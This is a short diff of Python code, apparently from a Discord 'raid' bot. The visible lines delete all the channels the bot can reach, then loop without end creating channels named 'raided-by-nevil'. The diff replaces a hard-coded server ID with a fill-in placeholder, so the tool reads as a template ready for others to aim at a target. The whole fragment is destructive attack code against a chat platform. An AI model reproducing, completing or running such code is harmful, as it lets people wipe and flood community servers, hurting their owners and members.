@@ -32,7 +32,7 @@ def main():
                     for channels in self.get_all_channels():
                         await channels.delete()
 
-                    guild = self.get_guild(1245613952373624832)
+                    guild = self.get_guild("ENTER SERVER ID MUST BE INTEGER!")
                     while True:
                         await guild.create_text_channel("raided-by-nevil")
                         if message.content == "break":
